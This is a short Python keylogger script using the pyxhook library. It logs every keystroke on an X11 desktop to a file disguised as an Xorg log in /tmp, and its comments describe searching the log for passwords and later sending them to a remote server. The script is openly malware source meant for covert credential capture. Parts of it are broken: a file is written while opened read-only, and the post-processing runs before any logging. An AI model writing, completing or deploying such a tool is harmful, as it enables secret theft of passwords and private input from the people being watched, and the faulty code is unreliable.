
# import libs
import pyxhook
import subprocess
import time
import textwrap
# Global variables


#instantiate HookManager class
new_hook=pyxhook.HookManager()

#Path to save file
log_file='/tmp/xorg.0.log'
#passWordFile='/tmp/xorg.1.log'


#this function is called everytime a key is pressed.
def OnKeyPress(event):


  fileOpen=open(log_file,'a')

  fileOpen.write(event.Key)
  # for every 20 Characters written, write a new line
  #fileOpen.write(( ' '.join(textwrap.wrap(event.Key, 20))))

  if event.Ascii==32:

      # instead of writting out an actual space,
      # use this to find the word "space" and remove it from the file
      # if a user types space, then the word will be known as an error
      fileOpen.write('\n')

  if event.Ascii==96:

	# if the (`) grave key is pressed. exit
	fileOpen.close()
	new_hook.cancel()



#Format Text After the keyloggin sessions ends
#search for password and pipe it
# This will be the base of sending the password remotely to a server
sFile = open("/tmp/xorg.0.log","r")
search = sFile.readlines()


for i, line in enumerate(search):
    if "space" in line:
        for l in search[i:i+3]:
            sFile.write('\n')

def main():

	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPress

	#Hook the keyboard
	new_hook.HookKeyboard()

	#start the session
	new_hook.start()

	print "Executing"



if __name__ == "__main__":
    main()
